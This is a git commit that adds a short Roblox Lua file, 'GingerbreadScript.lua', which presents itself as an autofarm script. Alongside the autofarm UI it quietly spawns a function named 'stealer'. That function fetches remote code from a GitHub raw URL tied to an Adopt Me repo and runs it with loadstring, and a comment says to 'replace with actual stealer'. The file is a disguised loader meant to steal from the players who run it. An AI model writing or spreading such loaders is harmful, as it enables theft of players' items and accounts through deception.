be6027c4c6105d52030622a4892d2f864035784a
kurobrut <kurokazawa123@gmail.com>
2025-12-06 11:18:57 +0800

    Create GingerbreadScript.lua

---
+++ GingerbreadScript.lua
@@ -0,0 +1,8 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkezzCreator/ADOPTMEE/refs/heads/main/SCRIPT", true))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/SkezzCreator/GINGER/refs/heads/main/AUTOFARM", true))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
